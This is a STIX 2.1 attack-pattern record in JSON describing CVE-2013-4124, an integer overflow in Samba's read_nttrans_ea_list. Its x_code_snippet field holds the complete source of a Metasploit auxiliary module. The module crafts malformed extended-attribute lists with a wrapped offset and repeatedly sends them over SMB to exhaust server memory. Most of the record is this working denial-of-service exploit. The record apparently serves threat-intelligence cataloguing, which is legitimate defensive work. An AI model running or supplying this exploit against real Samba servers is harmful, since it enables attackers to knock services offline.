{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--33a84af8-0c5b-4a1b-ada0-e8397dca8be5",
    "created": "2024-08-14T16:24:25.410198Z",
    "modified": "2024-08-14T16:24:25.410202Z",
    "name": "Samba read_nttrans_ea_list Integer Overflow",
    "description": " Integer overflow in the read_nttrans_ea_list function in nttrans.c in smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x before 4.0.8 allows remote attackers to cause a denial of service (memory consumption) via a malformed packet. Important Note: in order to work the \"ea support\" option on the target share must be enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/samba/read_nttrans_ea_list.rb",
            "external_id": "read_nttrans_ea_list.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4124"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/struct2'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n\n  TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(\n    [ 'uint16v', 'FID',       0 ],\n    [ 'uint16v', 'InfoLevel', 0 ],\n    [ 'uint16v', 'Reserved',  0 ],\n  )\n\n  FEA_LIST = Rex::Struct2::CStructTemplate.new(\n    [ 'uint32v', 'NextOffset', 0  ],\n    [ 'uint8',   'Flags',      0  ],\n    [ 'uint8',   'NameLen',    0  ],\n    [ 'uint16v', 'ValueLen',   0  ],\n    [ 'string',  'Name', nil,  '' ],\n    [ 'string',  'Value', nil, '' ]\n  )\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Samba read_nttrans_ea_list Integer Overflow',\n      'Description' => %q{\n        Integer overflow in the read_nttrans_ea_list function in nttrans.c in\n        smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x before\n        4.0.8 allows remote attackers to cause a denial of service (memory\n        consumption) via a malformed packet. Important Note: in order to work,\n        the \"ea support\" option on the target share must be enabled.\n      },\n      'Author'      =>\n        [\n          'Jeremy Allison', # Vulnerability discovery\n          'dz_lnly'         # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['OSVDB', '95969'],\n          ['BID', '61597'],\n          ['EDB', '27778'],\n          ['CVE', '2013-4124']\n        ],\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBShare', [true, 'Target share', '']),\n        OptInt.new('MsgLen', [true, 'How soon a memory get exhausted depends on the length of that attribute', 1500]),\n        OptInt.new('Tries', [true, 'Number of DOS tries', 40]),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def get_fid\n    ok = self.simple.client.create(\"/\")\n    return ok['Payload'].v['FileID']\n  end\n\n  def mk_items_payload\n    item1 = FEA_LIST.make_struct\n    item1.v['ValueLen'] = datastore['MsgLen']\n    item1.v['Value'] = \"\\x00\" * datastore['MsgLen']\n    item1.v['Name'] = Rex::Text.rand_text_alpha(5 + rand(3)) + \"\\x00\"\n    item1.v['NameLen'] = item1.v['Name'].length\n    item2 = FEA_LIST.make_struct\n    item2.v['ValueLen'] = datastore['MsgLen']\n    item2.v['Value'] = \"\\x00\" * datastore['MsgLen']\n    item2.v['Name'] = Rex::Text.rand_text_alpha(5 + rand(3)) + \"\\x00\"\n    item2.v['NameLen'] = item1.v['Name'].length\n    item3 = FEA_LIST.make_struct # Some padding\n    item3.v['ValueLen'] = 4\n    item3.v['Value'] = \"\\x00\\x00\\x00\\x00\"\n    item3.v['Name'] = Rex::Text.rand_text_alpha(5 + rand(3)) + \"\\x00\"\n    item3.v['NameLen'] = item1.v['Name'].length\n\n    ilen = item1.to_s.length\n    item1.v['NextOffset'] = ilen\n    # Wrap offset to 0x00\n    item2.v['NextOffset'] = 0xffffffff - ilen + 1\n    return item1.to_s + item2.to_s + item3.to_s\n  end\n\n  def send_pkt\n    fid = get_fid\n\n    trans = TRANS2_PARAM.make_struct\n    trans.v['FID'] = fid\n    trans.v['InfoLevel'] = 1015 # SMB_FILE_FULL_EA_INFORMATION\n    data = mk_items_payload\n    subcmd = 0x08\n    self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)\n  end\n\n  def run\n    print_status(\"Trying a max of #{datastore['Tries']} times...\")\n    datastore['Tries'].times do\n      connect(versions: [1])\n      smb_login()\n      self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\")\n\n      print_status('Sending malicious package...')\n      send_pkt\n\n      begin\n        self.simple.client.create(\"\")\n        print_error('Server Answered, DoS unsuccessful')\n      rescue Timeout::Error\n        print_good('Server timed out, this is expected')\n        return\n      rescue Rex::Proto::SMB::Exceptions::InvalidType\n        print_error('Server Answered, DoS unsuccessful')\n      end\n      disconnect()\n    end\n  end\nend\n"
}